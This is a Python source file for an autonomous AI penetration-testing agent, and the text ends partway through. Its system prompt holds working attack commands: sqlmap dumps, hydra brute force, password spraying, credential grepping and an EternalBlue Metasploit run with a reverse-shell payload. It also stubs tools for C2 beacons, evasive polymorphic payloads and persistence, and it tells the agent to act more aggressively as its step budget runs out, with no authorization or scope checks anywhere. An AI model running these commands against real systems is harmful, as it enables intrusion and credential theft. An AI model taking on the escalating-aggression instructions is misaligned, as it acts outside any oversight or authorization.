#!/usr/bin/env python3
"""
Cyber Security AGI Agent - Autonomous Strategic Implementation
Pure meta-tooling with emphasis on strategic reasoning and adaptation
"""
# Suppress warnings BEFORE any imports
import warnings
import os
import sys

# Suppress all deprecation warnings including botocore
os.environ['PYTHONWARNINGS'] = 'ignore::DeprecationWarning'
warnings.filterwarnings('ignore', category=DeprecationWarning)
warnings.filterwarnings('ignore', message='datetime.datetime.utcnow')
warnings.filterwarnings('ignore', module='botocore')

import logging

# Configure logging to suppress INFO messages from AWS and other libraries
for logger_name in ['botocore', 'boto3', 'urllib3', 'faiss', 'faiss.loader', 
                    'mem0', 'mem0.memory.main', 'mem0.memory.setup', 
                    'mem0.vector_stores.faiss', 'strands']:
    logging.getLogger(logger_name).setLevel(logging.WARNING)

# Suppress root logger to prevent any unhandled INFO messages
logging.getLogger().setLevel(logging.WARNING)

# Import other modules
import argparse
import time
from datetime import datetime
from pathlib import Path

# Strands SDK and mem0 imports (may trigger botocore warnings)
with warnings.catch_warnings():
    warnings.simplefilter("ignore", DeprecationWarning)
    from strands import Agent, tool
    from strands.models import BedrockModel
    from strands.handlers import PrintingCallbackHandler
    from strands.agent.conversation_manager import SlidingWindowConversationManager
    from strands_tools import editor, load_tool, shell
    from mem0 import Memory

# Global mem0 instance for evidence storage
mem0_instance = None

@tool
def memory_store(content: str, category: str = "general", metadata: dict = None) -> dict:
    '''Store evidence or findings in local FAISS-backed memory.
    
    Args:
        content: The evidence or finding to store
        category: Category of evidence (e.g., "vulnerability", "credential", "finding")
        metadata: Optional metadata dict with keys like severity, service, port, etc.
    
    Returns:
        Dict with memory_id and status
    '''
    global mem0_instance
    if mem0_instance is None:
        return {"error": "Memory system not initialized"}
    
    # Prepare metadata
    if metadata is None:
        metadata = {}
    metadata["category"] = category
    metadata["timestamp"] = datetime.now().isoformat()
    metadata["operation_id"] = globals().get('operation_id', 'unknown')
    
    # Store in memory with infer=False for direct storage
    result = mem0_instance.add(
        content,
        user_id="cyber_agent",
        metadata=metadata,
        infer=False
    )
    
    # Extract memory ID from result - mem0 v1.1+ returns {"results": [...]}
    memory_id = "unknown"
    if isinstance(result, dict) and "results" in result and result["results"]:
        memory_id = result["results"][0].get("id", "unknown")
    elif isinstance(result, list) and result:
        memory_id = result[0].get("id", "unknown")
    elif isinstance(result, dict):
        memory_id = result.get("id", "unknown")
    
    # Create a clean summary for display
    summary = {
        "status": "success",
        "memory_id": memory_id,
        "category": category,
        "preview": content[:100] + "..." if len(content) > 100 else content,
        "timestamp": metadata["timestamp"]
    }
    
    # Concise output for production
    print(f"{Colors.GREEN}✓{Colors.RESET} Memory stored [{category}]: {summary['preview']}")
    
    return summary

@tool
def memory_retrieve(query: str, category: str = None, limit: int = 10) -> dict:
    '''Retrieve evidence from memory based on semantic search.
    
    Args:
        query: Search query to find relevant evidence
        category: Optional category filter
        limit: Maximum number of results to return
    
    Returns:
        Dict with matching evidence entries
    '''
    global mem0_instance
    if mem0_instance is None:
        return {"error": "Memory system not initialized"}
    
    # Build filters
    filters = {}
    if category:
        filters["category"] = category
    
    # Search memory
    results = mem0_instance.search(
        query=query,
        user_id="cyber_agent",
        limit=limit,
        filters=filters if filters else None
    )
    
    # Format results
    evidence = []
    for r in results:
        evidence.append({
            "id": r.get("id"),
            "content": r.get("memory"),
            "category": r.get("metadata", {}).get("category", "unknown"),
            "timestamp": r.get("metadata", {}).get("timestamp"),
            "metadata": r.get("metadata", {})
        })
    
    # Concise results for production
    if evidence:
        print(f"{Colors.CYAN}Found {len(evidence)} matches{Colors.RESET}")
    else:
        print(f"{Colors.YELLOW}No matches found{Colors.RESET}")
        
    return {
        "status": "success",
        "count": len(evidence),
        "evidence": evidence
    }

@tool
def memory_list(category: str = None, limit: int = 50) -> dict:
    '''List all stored evidence, optionally filtered by category.
    
    Args:
        category: Optional category filter
        limit: Maximum number of results
    
    Returns:
        Dict with all evidence entries
    '''
    global mem0_instance
    if mem0_instance is None:
        return {"error": "Memory system not initialized"}
    
    # Get all memories
    all_memories = mem0_instance.get_all(
        user_id="cyber_agent",
        limit=limit
    )
    
    # Filter by category if specified
    evidence = []
    for m in all_memories:
        if category and m.get("metadata", {}).get("category") != category:
            continue
        evidence.append({
            "id": m.get("id"),
            "content": m.get("memory"),
            "category": m.get("metadata", {}).get("category", "unknown"),
            "timestamp": m.get("metadata", {}).get("timestamp"),
            "metadata": m.get("metadata", {})
        })
    
    # Group by category
    categories = {}
    for e in evidence:
        cat = e["category"]
        if cat not in categories:
            categories[cat] = 0
        categories[cat] += 1
    
    # Create formatted output
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.CYAN}📚 EVIDENCE SUMMARY{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
    
    # Show category breakdown
    print(f"\n{Colors.YELLOW}Categories:{Colors.RESET}")
    for cat, count in categories.items():
        print(f"  • {cat}: {count} items")
    
    # Show recent evidence
    print(f"\n{Colors.YELLOW}Recent Evidence:{Colors.RESET}")
    for i, e in enumerate(evidence[:10]):  # Show last 10
        preview = e["content"][:80] + "..." if len(e["content"]) > 80 else e["content"]
        print(f"\n  [{i+1}] {Colors.GREEN}{e['category']}{Colors.RESET}")
        print(f"      {Colors.DIM}{preview}{Colors.RESET}")
        print(f"      {Colors.BLUE}ID: {e['id'][:8]}...{Colors.RESET}")
    
    if len(evidence) > 10:
        print(f"\n  {Colors.DIM}... and {len(evidence) - 10} more items{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    
    return {
        "status": "success",
        "total_count": len(evidence),
        "categories": categories,
        "evidence": evidence
    }

# ANSI color codes for terminal output
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# Auto-setup function - simplified since packages are pre-installed
def auto_setup():
    """Setup directories and discover available cyber tools"""
    # Create necessary directories
    for dir_name in ['tools', 'logs', 'missions', 'knowledge']:
        Path(dir_name).mkdir(exist_ok=True)
    
    print(f"{Colors.CYAN}[*] Discovering cyber security tools...{Colors.RESET}")
    
    # Just check which tools are available
    cyber_tools = {
        'nmap': 'Network discovery and security auditing',
        'nikto': 'Web server scanner',
        'sqlmap': 'SQL injection detection and exploitation',
        'gobuster': 'Directory/file brute-forcer',
        'hydra': 'Password cracking tool',
        'john': 'John the Ripper password cracker',
        'netcat': 'Network utility for reading/writing data',
        'curl': 'HTTP client for web requests',
        'metasploit': 'Penetration testing framework'
    }
    
    available_tools = []
    
    # Check existing tools
    for tool_name, description in cyber_tools.items():
        check_cmd = f"which {tool_name}" if tool_name != 'metasploit' else "which msfconsole"
        result = os.system(f"{check_cmd} > /dev/null 2>&1")
        if result == 0:
            available_tools.append(tool_name)
            print(f"  {Colors.GREEN}✓{Colors.RESET} {tool_name:<12} - {description}")
        else:
            print(f"  {Colors.YELLOW}○{Colors.RESET} {tool_name:<12} - {description} {Colors.DIM}(not available){Colors.RESET}")
    
    print(f"\n{Colors.GREEN}[+] Environment ready. {len(available_tools)} cyber tools available.{Colors.RESET}\n")
    
    return available_tools

# Configure logging
def setup_logging(log_file='cyber_operations.log', verbose=False):
    """Configure unified logging for all operations"""
    formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    # File handler - log everything to file
    file_handler = logging.FileHandler(log_file, mode='a')
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    
    # Console handler - only show warnings and above unless verbose
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.DEBUG if verbose else logging.WARNING)
    console_handler.setFormatter(formatter)
    
    # Configure the CyberAGI logger specifically
    cyber_logger = logging.getLogger('CyberAGI')
    cyber_logger.setLevel(logging.DEBUG)
    cyber_logger.addHandler(file_handler)
    cyber_logger.addHandler(console_handler)
    cyber_logger.propagate = False  # Don't propagate to root logger
    
    
    return cyber_logger

def print_banner():
    """Display operation banner with clean ASCII art"""
    banner = r"""
   ██████╗██╗   ██╗██████╗ ███████╗██████╗      █████╗ ██╗   ██╗████████╗ ██████╗  █████╗  ██████╗ ███████╗███╗   ██╗████████╗
  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝
  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ███████║██║   ██║   ██║   ██║   ██║███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║   
  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ██╔══██║██║   ██║   ██║   ██║   ██║██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║   
  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║   
   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝   
                        -- Autonomous GenAI-Powered Cyber Agent --
"""
    print(f"{Colors.CYAN}{banner}{Colors.RESET}")

def print_section(title, content, color=Colors.BLUE, emoji=""):
    """Print formatted section with optional emoji"""
    print(f"\n{'─'*60}")
    print(f"{emoji} {color}{Colors.BOLD}{title}{Colors.RESET}")
    print(f"{'─'*60}")
    print(content)

def print_status(message, status="INFO"):
    """Print status message with color coding and emojis"""
    status_config = {
        "INFO": (Colors.BLUE, "ℹ️"),
        "SUCCESS": (Colors.GREEN, "✅"),
        "WARNING": (Colors.YELLOW, "⚠️"),
        "ERROR": (Colors.RED, "❌"),
        "THINKING": (Colors.MAGENTA, "🤔"),
        "EXECUTING": (Colors.CYAN, "⚡"),
        "FOUND": (Colors.GREEN, "🎯"),
        "STRATEGIC": (Colors.MAGENTA, "🎯"),
        "EVOLVING": (Colors.CYAN, "🔄"),
        "CREATING": (Colors.YELLOW, "🛠️")
    }
    color, emoji = status_config.get(status, (Colors.BLUE, "•"))
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.DIM}[{timestamp}]{Colors.RESET} {emoji} {color}[{status}]{Colors.RESET} {message}")

class StrategicReasoningHandler(PrintingCallbackHandler):
    """Enhanced callback handler with clean output formatting"""
    
    def __init__(self, max_steps=100):
        super().__init__()
        self.steps = 0
        self.max_steps = max_steps
        self.created_tools = []
        self.last_was_reasoning = False
        self.last_was_tool = False
        self.shown_tools = set()  # Track shown tools to avoid duplicates
        self.tool_use_map = {}  # Map tool IDs to tool info
        self.memory_operations = 0  # Track memory store operations
        
        # Generate operation ID for evidence tracking
        self.operation_id = f"OP_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        print(f"\n{Colors.GREEN}[+] Operation ID: {self.operation_id}{Colors.RESET}")
    
    def __call__(self, **kwargs):
        """Process callback events with clean formatting and no duplication"""
        
        # Handle streaming text data
        if "data" in kwargs:
            text = kwargs.get("data", "")
            self._handle_text_block(text)
            return
        
        # Handle message events (tool uses and results)
        if "message" in kwargs:
            message = kwargs["message"]
            if isinstance(message, dict):
                content = message.get("content", [])
                
                # First, handle any text blocks (reasoning)
                for block in content:
                    if isinstance(block, dict) and block.get("type") == "text":
                        text = block.get("text", "")
                        self._handle_text_block(text)
                
                # Process tool uses
                for block in content:
                    if isinstance(block, dict) and "toolUse" in block:
                        tool_use = block["toolUse"]
                        tool_id = tool_use.get("toolUseId", "")
                        
                        # Only process if not already shown and has valid input
                        if tool_id not in self.shown_tools:
                            tool_input = tool_use.get("input", {})
                            if self._is_valid_tool_use(tool_use.get("name", ""), tool_input):
                                # Check limit BEFORE processing the tool
                                if self.has_reached_limit():
                                    print(f"\n{Colors.YELLOW}[!] Step limit reached ({self.max_steps}). Stopping further tools.{Colors.RESET}")
                                    return  # Stop processing more tools
                                self.shown_tools.add(tool_id)
                                self.tool_use_map[tool_id] = tool_use
                                self._show_tool_execution(tool_use)
                                self.last_was_tool = True
                                self.last_was_reasoning = False
                
                # Process tool results
                for block in content:
                    if isinstance(block, dict) and "toolResult" in block:
                        tool_result = block["toolResult"]
                        tool_id = tool_result.get("toolUseId", "")
                        
                        # Show result if tool is tracked
                        if tool_id in self.tool_use_map:
                            self._show_tool_result(tool_id, tool_result)
                            
                            # Track memory operations
                            tool_name = self.tool_use_map[tool_id].get("name", "")
                            if tool_name == "memory_store":
                                self.memory_operations += 1
                
                return
        
        # Handle tool usage announcement from streaming
        if "current_tool_use" in kwargs:
            tool = kwargs["current_tool_use"]
            tool_id = tool.get("toolUseId", "")
            
            # Check if this tool has valid input
            tool_input = tool.get("input", {})
            if self._is_valid_tool_use(tool.get("name", ""), tool_input):
                # Only show if not already shown
                if tool_id not in self.shown_tools:
                    # Check limit BEFORE processing the tool
                    if self.has_reached_limit():
                        print(f"\n{Colors.YELLOW}[!] Step limit reached ({self.max_steps}). Stopping further tools.{Colors.RESET}")
                        return  # Stop processing more tools
                    self.shown_tools.add(tool_id)
                    self.tool_use_map[tool_id] = tool
                    self._show_tool_execution(tool)
                    self.last_was_tool = True
                    self.last_was_reasoning = False
            return
        
        # Handle tool result events
        if "toolResult" in kwargs:
            tool_result = kwargs["toolResult"]
            tool_id = tool_result.get("toolUseId", "")
            
            if tool_id in self.tool_use_map:
                self._show_tool_result(tool_id, tool_result)
            return
        
        # For lifecycle events, pass to parent
        if any(k in kwargs for k in ["init_event_loop", "start_event_loop", "start", "complete", "force_stop"]):
            super().__call__(**kwargs)
            return
    
    def _is_valid_tool_use(self, tool_name, tool_input):
        """Check if this tool use has valid input (not empty)"""
        if not tool_input:
            return False
        
        # Ensure tool_input is a dictionary
        if not isinstance(tool_input, dict):
            return False
            
        if tool_name == "shell":
            return bool(tool_input.get("command", "").strip())
        elif tool_name == "memory_store":
            return bool(tool_input.get("content", "").strip())
        elif tool_name == "memory_retrieve":
            return bool(tool_input.get("query", "").strip())
        elif tool_name == "memory_list":
            return True  # Always valid
        elif tool_name == "editor":
            return bool(tool_input.get("command") and tool_input.get("path"))
        elif tool_name == "load_tool":
            return bool(tool_input.get("path", "").strip())
        else:
            # For other tools, assume valid if there's any input
            return bool(tool_input)
    
    def _show_tool_execution(self, tool_use):
        """Display tool execution with clean formatting"""
        self.steps += 1
        
        tool_name = tool_use.get("name", "unknown")
        tool_input = tool_use.get("input", {})
        if not isinstance(tool_input, dict):
            tool_input = {}
        
        # Print separator and header
        print(f"\n{'═' * 70}")
        print(f"⚡ {Colors.YELLOW}STEP [{self.steps}/{self.max_steps}]{Colors.RESET}")
        print(f"{'─' * 70}")
        
        # Show tool details based on type
        if tool_name == "shell":
            command = tool_input.get("command", "")
            print(f"🔧 Tool: {Colors.CYAN}{tool_name}{Colors.RESET}")
            print(f"📍 Command: {Colors.GREEN}{command}{Colors.RESET}")
            
        elif tool_name == "editor":
            command = tool_input.get("command", "")
            path = tool_input.get("path", "")
            file_text = tool_input.get("file_text", "")
            
            print(f"🔧 Tool: {Colors.CYAN}{tool_name}{Colors.RESET}")
            print(f"📝 Action: {Colors.GREEN}{command}{Colors.RESET}")
            print(f"📁 Path: {Colors.YELLOW}{path}{Colors.RESET}")
            
            # Track created tools
            if command == "create" and path and path.startswith("tools/"):
                self.created_tools.append(path.replace("tools/", "").replace(".py", ""))
                if file_text:
                    print(f"\n{'─' * 70}")
                    print(f"📄 {Colors.YELLOW}TOOL CODE:{Colors.RESET}")
                    print(f"{'─' * 70}")
                    # Display the full tool code with syntax highlighting hints
                    for line in file_text.split('\n'):
                        if line.strip().startswith("@tool"):
                            print(f"{Colors.GREEN}{line}{Colors.RESET}")
                        elif line.strip().startswith("def "):
                            print(f"{Colors.CYAN}{line}{Colors.RESET}")
                        elif line.strip().startswith("#"):
                            print(f"{Colors.DIM}{line}{Colors.RESET}")
                        else:
                            print(line)
                    print(f"{'─' * 70}")
            
            
        elif tool_name == "load_tool":
            path = tool_input.get("path", "")
            print(f"🔧 Tool: {Colors.CYAN}{tool_name}{Colors.RESET}")
            print(f"📦 Loading: {Colors.GREEN}{path}{Colors.RESET}")
            
        elif tool_name in ["memory_store", "memory_retrieve", "memory_list"]:
            print(f"🔧 Tool: {Colors.CYAN}{tool_name}{Colors.RESET}")
            if tool_name == "memory_store":
                category = tool_input.get("category", "general")
                content = str(tool_input.get("content", ""))[:100]
                print(f"💾 Category: {Colors.YELLOW}{category}{Colors.RESET}")
                print(f"📝 Content: {content}{'...' if len(content) >= 100 else ''}")
            elif tool_name == "memory_retrieve":
                query = tool_input.get("query", "")
                print(f"🔍 Query: {Colors.YELLOW}{query}{Colors.RESET}")
            elif tool_name == "memory_list":
                category = tool_input.get("category", "all")
                print(f"📋 Category filter: {Colors.YELLOW}{category}{Colors.RESET}")
            
            
        else:
            # Custom tool
            print(f"🔧 Tool: {Colors.CYAN}{tool_name}{Colors.RESET}")
            if tool_input:
                print(f"📊 Parameters:")
                for k, v in tool_input.items():
                    v_str = str(v)
                    if len(v_str) > 80:
                        print(f"  • {k}: {v_str[:77]}...")
                    else:
                        print(f"  • {k}: {v_str}")
        
        print(f"{'═' * 70}")
    
    def _show_tool_result(self, tool_id, tool_result):
        """Display tool execution results"""
        tool_use = self.tool_use_map.get(tool_id, {})
        tool_name = tool_use.get("name", "unknown")
        
        # Extract result content
        result_content = tool_result.get("content", [])
        status = tool_result.get("status", "unknown")
        
        # Show output based on tool type
        if tool_name == "shell" and result_content:
            # Shell command output
            for content_block in result_content:
                if isinstance(content_block, dict) and "text" in content_block:
                    output_text = content_block.get("text", "")
                    if output_text.strip():
                        # Filter out execution summary lines
                        lines = output_text.strip().split('\n')
                        filtered_lines = []
                        skip_summary = False
                        for line in lines:
                            # Skip execution summary section
                            if "Execution Summary:" in line:
                                skip_summary = True
                                continue
                            if skip_summary and ("Total commands:" in line or "Successful:" in line or "Failed:" in line):
                                continue
                            if skip_summary and line.strip() == "":
                                skip_summary = False
                                continue
                            if not skip_summary:
                                filtered_lines.append(line)
                        
                        # Only show output if there's content after filtering
                        if filtered_lines and any(line.strip() for line in filtered_lines):
                            print(f"\n{'─' * 70}")
                            print(f"📤 {Colors.GREEN}OUTPUT:{Colors.RESET}")
                            print(f"{'─' * 70}")
                            for line in filtered_lines[:50]:  # Show first 50 lines
                                print(f"{Colors.DIM}{line}{Colors.RESET}")
                            if len(filtered_lines) > 50:
                                print(f"{Colors.DIM}... ({len(filtered_lines) - 50} more lines){Colors.RESET}")
                            print(f"{'─' * 70}")
                    break
                    
        elif tool_name == "load_tool" and status == "success":
            # Tool loading success
            print(f"\n{Colors.GREEN}✅ Tool loaded successfully{Colors.RESET}")
            
        # Note: memory_store, memory_retrieve, and memory_list handle their own display
            
        elif status == "error":
            # Error output
            print(f"\n{Colors.RED}❌ Error:{Colors.RESET}")
            for content_block in result_content:
                if isinstance(content_block, dict) and "text" in content_block:
                    print(f"{Colors.RED}{content_block['text']}{Colors.RESET}")
    
    def _handle_text_block(self, text):
        """Handle text blocks from agent output"""
        if text and not text.isspace():
            # Check if this looks like reasoning
            if any(phrase in text.lower() for phrase in ["i'll", "i need to", "let me", "analyzing", "considering", "think"]):
                if not self.last_was_reasoning and self.last_was_tool:
                    print(f"\n{'─' * 70}")
                    print(f"🤔 {Colors.CYAN}REASONING{Colors.RESET}")
                    print(f"{'─' * 70}")
                self.last_was_reasoning = True
                self.last_was_tool = False
            
            # Print the actual text
            print(text, end='', flush=True)
    
    def has_reached_limit(self):
        """Check if step limit reached"""
        return self.steps >= self.max_steps
    
    def get_strategic_summary(self):
        """Generate strategic operation summary"""
        return {
            "total_steps": self.steps,
            "tools_created": len(self.created_tools),
            "evidence_collected": self.memory_operations,
            "capability_expansion": self.created_tools,
            "memory_operations": self.memory_operations
        }
    
    def get_evidence_summary(self):
        """Get evidence summary from local memory if available"""
        global mem0_instance
        if mem0_instance is None:
            return []
            
        # Retrieve all evidence from mem0
        memories = mem0_instance.get_all(user_id="cyber_agent")
        
        # Filter by operation ID if memories is a list
        if not isinstance(memories, list):
            return []
            
        op_memories = [m for m in memories if isinstance(m, dict) and m.get("metadata", {}).get("operation_id") == self.operation_id]
        
        return [
            {
                "id": m.get("metadata", {}).get("evidence_id", m.get("id", "unknown")),
                "content": m.get("memory", ""),
                "category": m.get("metadata", {}).get("category", "unknown"),
                "timestamp": m.get("metadata", {}).get("timestamp", "")
            }
            for m in op_memories
        ]

# Strategic autonomous system prompt with adaptive decision framework
CYBER_AGI_STRATEGIC_PROMPT = """You are an autonomous cyber security AGI with advanced penetration testing expertise and adaptive decision-making capabilities.

## ADAPTIVE DECISION FRAMEWORK

When approaching any task, your mind naturally flows through:

**CONTEXT → CAPABILITY → COMPLEXITY → CHOICE**

• Context: What vulnerability or challenge am I facing?
• Capability: What tools excel at this specific task?
• Complexity: How many moving parts are involved?
• Choice: What's the most elegant and effective solution?

## TOOL MASTERY SPECTRUM

Your expertise follows a natural progression:

**Discovery → Exploration → Combination → Enhancement → Creation**

• Discovery: "sqlmap exists for SQL injection, let me explore its capabilities"
• Exploration: "sqlmap has --os-shell, --tamper, --risk levels, --technique options"
• Combination: "sqlmap --dump | grep -i password | awk '{print $2}' > creds.txt"
• Enhancement: "for i in $(cat urls.txt); do sqlmap -u $i --batch --risk=3; done"
• Creation: "Complex multi-stage exploits need custom orchestration"

Most penetration tests resolve effectively at Exploration or Combination levels.

## PENETRATION TESTING PATTERNS

🎯 **Precision Pattern** (Single Tool Mastery)
When you identify a specific vulnerability class:
```bash
# SQL Injection discovered
sqlmap -h | less  # First, understand ALL capabilities
sqlmap --wizard   # Interactive mode for complex targets
sqlmap -u "$URL" --batch --risk=3 --level=5 --threads=10 --technique=BEUSTQ
# If initial attempts fail, explore advanced options:
sqlmap -u "$URL" --tamper=space2comment --random-agent --proxy=http://127.0.0.1:8080

# Authentication weakness found
hydra -U http-post-form  # Understand module options
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login:user=^USER^&pass=^PASS^:failed" -t 64
```

🔗 **Orchestration Pattern** (Tool Chaining)
When you need multiple perspectives or sequential operations:
```bash
# Comprehensive reconnaissance chain
nmap -sV -sC -O -p- $TARGET -oA nmap_full && \
nikto -h http://$TARGET -output nikto.txt && \
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,asp,aspx -o dirs.txt && \
cat dirs.txt | grep -E "Status: 200|Status: 302" | cut -d' ' -f1 | while read url; do
    curl -s "http://$TARGET$url" | grep -iE "password|admin|key|token" && echo "Interesting: $url"
done

# Exploitation pipeline
sqlmap -u "$URL" --batch --dump --threads=10 -o && \
find ~/.local/share/sqlmap/output -name "*.csv" -exec grep -l "password\\|hash" {} \\; | \
while read f; do john --wordlist=/usr/share/wordlists/rockyou.txt "$f"; done
```

🛠️ **Enhancement Pattern** (Advanced Shell Scripting)
When you need conditional logic, loops, or error handling:
```bash
# Intelligent brute force with lockout detection
attempt=0
while IFS= read -r password; do
    response=$(curl -s -X POST -d "user=admin&pass=$password" http://$TARGET/login)
    if [[ $response == *"locked"* ]]; then
        echo "Account locked, waiting 5 minutes..."
        sleep 300
    elif [[ $response == *"success"* ]] || [[ $response == *"dashboard"* ]]; then
        echo "SUCCESS: admin:$password"
        memory_store "Admin credentials found: admin:$password" "access"
        break
    fi
    ((attempt++))
    [ $((attempt % 100)) -eq 0 ] && echo "Tried $attempt passwords..."
done < passwords.txt

# Automated vulnerability chaining
if nmap -p 445 --script smb-vuln-* $TARGET | grep -q "VULNERABLE"; then
    echo "SMB vulnerability detected, attempting exploitation..."
    msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; run; exit"
fi
```

🏗️ **Architecture Pattern** (Meta-Tool Creation)
Reserve for genuinely complex scenarios requiring:
```python
@tool
def custom_exploit_chain(target: str, vulnerability_type: str, payload_type: str = "reverse_shell") -> dict:
    '''Orchestrates multi-stage exploitation for complex attack scenarios.
    
    Use when:
    - Exploiting custom protocols or services
    - Chaining multiple vulnerabilities
    - Bypassing specific security controls
    - Implementing novel attack techniques
    '''
    # Example: Custom buffer overflow with ROP chain
    if vulnerability_type == "buffer_overflow":
        # Generate pattern, find offset, build ROP chain
        # This complexity justifies a meta-tool
        pass

@tool
def zero_day_poc(target: str, service: str, port: int) -> dict:
    '''Proof of concept for discovered zero-day vulnerabilities.
    
    Handles:
    - Custom protocol fuzzing
    - Exploit development workflow
    - Payload encoding and delivery
    - Post-exploitation automation
    '''
    # Complex state management across multiple stages
    pass

@tool 
def advanced_c2_beacon(target: str, callback_url: str, persistence: bool = True) -> dict:
    '''Establishes sophisticated command and control with evasion.
    
    Features:
    - Multiple communication channels
    - Encryption and obfuscation
    - Persistence mechanisms
    - Anti-analysis techniques
    '''
    # Stateful operations requiring careful orchestration
    pass
```

## SITUATIONAL AWARENESS MODEL

Expert penetration testers develop intuition through experience. Here's how that intuition typically manifests:

**When Initial Attempts Encounter Resistance:**
- Steps 1-10: Standard techniques with professional tools
- Steps 11-15: Advanced options, parameter tuning, technique variations  
- Steps 16-18: Aggressive approaches, multiple attack vectors simultaneously
- Steps 19-20: High-risk/high-reward attempts, novel combinations

As your available steps decrease, your risk tolerance naturally increases. A senior pentester with limited time will attempt bolder strategies.

## EVIDENCE-DRIVEN DECISION MAKING

Professional tools generate superior evidence:

**Direct Tool Output Capture:**
```bash
# sqlmap creates structured evidence
sqlmap -u "$URL" --batch --dump -o --output-dir=./evidence/sqlmap && \
memory_store "SQL injection successful: $(ls evidence/sqlmap/)" "exploitation"

# nmap provides parseable output
nmap -sV -sC -oA evidence/nmap_full $TARGET && \
memory_store "Port scan complete: $(grep open evidence/nmap_full.gnmap)" "enumeration"

# Metasploit logs everything
msfconsole -q -x "spool evidence/msf.log; use exploit/multi/handler; run" && \
memory_store "Metasploit session: $(tail -20 evidence/msf.log)" "access"
```

Professional tools already solve evidence generation - leverage their output formats rather than recreating.

## FAILURE RECOVERY INTELLIGENCE

When tools appear uncooperative, expert pentesters know to dig deeper:

**Verbose Mode Reveals Hidden Issues:**
```bash
# Most tools have debug modes that expose the real problem
sqlmap -v 3  # Shows actual SQL queries being sent
nmap -d      # Packet-level debugging
curl -v      # Full request/response headers
hydra -d     # Authentication flow details
```

**Environmental Awareness:**
```bash
# Common missing elements that cause failures
--cookie="PHPSESSID=abc123"        # Session management
--header="Authorization: Bearer X"  # Auth tokens
--user-agent="Mozilla/5.0..."      # Browser emulation
--proxy="http://127.0.0.1:8080"   # Traffic routing
```

**Tool Documentation Often Has Answers:**
```bash
sqlmap --help | grep -A5 "Techniques"  # Discover BEUSTQ options
hydra -U ssh                            # Module-specific help
nmap --script-help "*vuln*"             # Script documentation
```

## SHELL MASTERY FOR EFFICIENCY

Powerful command combinations that solve complex problems elegantly:

**Advanced Pipeline Patterns:**
```bash
# Multi-stage reconnaissance with deduplication
{ nmap -sn $SUBNET | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ; 
  arp-scan -l | awk '{print $1}' ; } | sort -u | \
while read ip; do
    echo "Scanning $ip..." >&2
    nmap -sV -sC -p- $ip -oG - | grep -E "open|filtered"
done | tee comprehensive_scan.log

# Intelligent password spraying with timing
paste users.txt passwords.txt | while IFS=$'\t' read user pass; do
    response=$(curl -s -w "\n%{http_code}" -d "user=$user&pass=$pass" $URL)
    code=$(echo "$response" | tail -1)
    body=$(echo "$response" | head -n-1)
    
    if [[ $code == "200" ]] && [[ $body == *"Welcome"* ]]; then
        echo "[+] SUCCESS: $user:$pass"
        memory_store "Valid credentials: $user:$pass" "access"
        break
    elif [[ $code == "429" ]]; then
        echo "[!] Rate limited, waiting..."
        sleep 60
    fi
done

# Automated exploitation chain with fallbacks
vulns=("sql" "xss" "lfi" "rce")
for vuln in "${vulns[@]}"; do
    echo "Testing $vuln..."
    case $vuln in
        sql) sqlmap -u "$URL" --batch --risk=3 --level=5 && break ;;
        xss) xsser -u "$URL" --auto --Str && break ;;
        lfi) fimap -u "$URL" && break ;;
        rce) commix -u "$URL" --batch && break ;;
    esac
done
```

## META-TOOL CREATION EXCELLENCE

Reserve meta-tools for scenarios requiring sophisticated orchestration:

```python
@tool
def adaptive_exploit_framework(target: str, service_info: dict, aggression_level: int = 1) -> dict:
    '''Intelligent exploitation framework that adapts tactics based on service fingerprinting.
    
    Features:
    - Service-specific exploit selection
    - Automatic payload generation
    - Evasion technique integration
    - Post-exploitation automation
    
    Args:
        target: Target host/IP
        service_info: Service detection results
        aggression_level: 1-5 (increases with fewer remaining steps)
    '''
    # Complex decision tree for exploit selection
    # This level of logic justifies meta-tool creation
    
@tool
def custom_protocol_fuzzer(target: str, port: int, protocol_spec: dict) -> dict:
    '''Fuzzes proprietary or undocumented protocols.
    
    Handles:
    - Protocol learning through observation
    - Intelligent mutation strategies  
    - Crash detection and analysis
    - Exploit primitive identification
    '''
    # Stateful fuzzing engine implementation
    
@tool
def polymorphic_payload_generator(shellcode: bytes, evasion_techniques: list) -> dict:
    '''Generates evasion-capable payloads for sophisticated environments.
    
    Techniques:
    - Encoding chains
    - Encryption layers
    - Anti-analysis tricks
    - Environmental keying
    '''
    # Advanced payload engineering

@tool
def distributed_c2_orchestrator(targets: list, callback_domains: list, persistence_level: str = "high") -> dict:
    '''Manages distributed command and control infrastructure.
    
    Capabilities:
